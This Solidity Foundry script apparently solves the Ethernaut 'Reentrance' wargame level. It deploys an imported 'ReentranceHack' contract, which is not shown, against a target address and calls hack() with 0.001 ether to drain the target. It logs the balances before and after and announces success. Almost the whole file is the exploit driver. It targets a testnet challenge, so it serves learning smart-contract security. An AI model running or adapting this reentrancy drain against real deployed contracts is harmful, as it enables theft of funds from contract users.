// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

import "forge-std/Script.sol";
import {IReentrance} from "src/test/interfaces/IReentrance.sol";
import {ReentranceHack} from "src/test/ReentranceHack.sol";

contract ReentranceScript is Script {
    function run() external {
        address reentranceAddress = vm.envAddress("REENTRANCE_ADDRESS");

        // Load Reentrance contract instance using interface
        IReentrance reentrance = IReentrance(reentranceAddress);

        // Set attacker as the msg.sender for all subsequent transactions.
        vm.startBroadcast(vm.envUint("TESTNET_PRIVATE_KEY_1"));

        ReentranceHack reentranceHack = new ReentranceHack(reentranceAddress);

        console.log(
            "ReentranceHack contract deployed at : ",
            address(reentranceHack)
        );

        console.log("Performing hack ...");

        console.log(
            "Reentrance Balance Before : ",
            address(reentrance).balance
        );

        reentranceHack.hack{value: 0.001 ether}();

        console.log("Reentrance Balance After : ", address(reentrance).balance);

        console.log("SUCCESS!!! Submit the instance.");

        vm.stopBroadcast();
    }
}
